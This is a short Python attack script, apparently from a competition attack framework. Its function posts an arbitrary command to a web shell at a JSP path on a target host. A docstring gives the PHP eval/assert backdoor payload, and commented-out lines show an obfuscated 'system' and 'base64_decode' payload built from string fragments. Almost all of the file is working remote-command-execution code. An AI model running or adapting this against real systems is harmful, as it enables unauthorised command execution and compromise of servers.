#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    eval($_POST[333]);
    assert($_POST[333]);
    '''
    
    try:           
        #cmd = base64.b64encode(cmd)
        # This payload may not work under some php versions
        #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
        #print payload
        data = 'haozigege=%s'% quote(cmd) 
        res = http("post",target,target_port,"/charpter2-1.0-SNAPSHOT/1.jsp",data,headers)
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res




